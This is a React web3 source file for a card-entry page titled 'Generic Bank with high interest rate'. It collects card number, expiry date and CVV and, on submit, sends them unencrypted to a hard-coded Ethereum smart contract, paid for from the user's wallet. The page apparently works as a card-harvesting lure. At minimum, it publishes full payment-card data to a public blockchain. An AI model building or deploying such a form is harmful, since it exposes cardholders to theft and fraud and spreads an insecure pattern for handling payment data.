import React, { useState } from "react";
import { String } from "./abi/abi";
import Web3 from "web3";
import "./App.css";
import Nav from "./components/Nav";
import Footer from "./components/Footer";

const web3 = new Web3(Web3.givenProvider);
const contractAddress = "0x05E839b0CE24c3B5D22eD35E58A24341D48D5214";
const storageContract = new web3.eth.Contract(String, contractAddress);

function App() {
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");

  const handleCardNumberChange = (event) => {
    let { value } = event.target;
    value = value.replace(/\D/g, ""); // Remove non-numeric characters

    if (value.length <= 16) {
      const spacedValue = value.replace(/(.{4})/g, "$1 "); // Add space every 4 characters

      setCardNumber(spacedValue);
    }
  };

  const handleExpiryDateChange = (event) => {
    let { value } = event.target;
    value = value.replace(/\D/g, ""); // Remove non-numeric characters

    if (value.length <= 4) {
      const formattedValue = value.replace(/(.{2})/, "$1/"); // Add '/' after 2 characters

      setExpiryDate(formattedValue);
    }
  };

  const handleCvvChange = (event) => {
    let { value } = event.target;
    value = value.replace(/\D/g, ""); // Remove non-numeric characters

    if (value.length <= 3) {
      setCvv(value);
    }
  };

  const contractSetter = async (t) => {
    t.preventDefault();
   
    const accounts = await window.ethereum.enable();
    const account = accounts[0];
    // Get permission to access user funds to pay for gas fees


    const gas = await storageContract.methods.setter(cardNumber,cvv,expiryDate).estimateGas();


    const post = await storageContract.methods.setter(cardNumber,cvv,expiryDate).send({
      from: account,
      gas,
    });
  };
  

  // Rest of the code...

  return (
    <div className="container-fluid p-0">
    <Nav />
    <br/> <br/> <br/> <br/>
      <div className="row justify-content-center">
        <div className="col-lg-4 col-md-6">
          <div
            className="card p-4 desktop-card"
            style={{


              backgroundColor: "#007bff",
              borderRadius: "0",
              color: "#fff",
              boxShadow: "0 4px 8px rgba(0, 0, 0, 0.1)",
            }}
          >
            
            <h6 className="card-title" style={{ fontSize: "24px", marginBottom: "20px", fontFamily:"Lucida Console"}}>
            <br />Generic Bank with high interest rate
            </h6>
            {/* Using self-closing form tag */}
            <form className="form-group">
              <label htmlFor="cardNumber">Card Number </label>
              <input
                type="text"
                className="form-control"
                id="cardNumber"
                placeholder="Enter card number"
                value={cardNumber}
                onChange={handleCardNumberChange}
                style={{
                  backgroundColor: "rgba(255, 255, 255, 0.15)",
                  border: "none",
                  borderRadius: "0",
                  padding: "10px",
                  color: "#fff",
                  marginBottom: "15px",
                }}
              />
            </form>

            {/* Using a div wrapper */}
            <div className="form-group">
              <label htmlFor="expiryDate">Expiry Date&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</label>
              <input
                type="text"
                className="form-control"
                id="expiryDate"
                placeholder="MM/YY"
                value={expiryDate}
                onChange={handleExpiryDateChange}
                style={{
                  backgroundColor: "rgba(255, 255, 255, 0.15)",
                  border: "none",
                  borderRadius: "0",
                  padding: "10px",
                  color: "#fff",
                  marginBottom: "15px",
                }}
              />
            </div>

            {/* Using React.Fragment */}
            <React.Fragment>
              <div className="form-group">
                <label htmlFor="cvv">CVV&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</label>
                <input
                  type="text"
                  className="form-control"
                  id="cvv"
                  placeholder="CVV"
                  value={cvv}
                  onChange={handleCvvChange}
                  style={{
                    backgroundColor: "rgba(255, 255, 255, 0.15)",
                    border: "none",
                    borderRadius: "0",
                    padding: "10px",
                    color: "#fff",
                    marginBottom: "15px",
                  }}
                />
              </div>
              <button type="submit" value="Confirm" onClick={contractSetter}
                className="btn btn-primary"
                style={{
                  backgroundColor: "#fff",
                  color: "#007bff",
                  border: "none",
                  borderRadius: "0",
                  padding: "10px 20px",
                  fontWeight: "bold",
                  cursor: "pointer",
                }}
              >
                Submit
              </button>
              
            </React.Fragment>
          </div>
        </div>
      </div>
      <Footer/>
    </div>
  );
}

export default App;
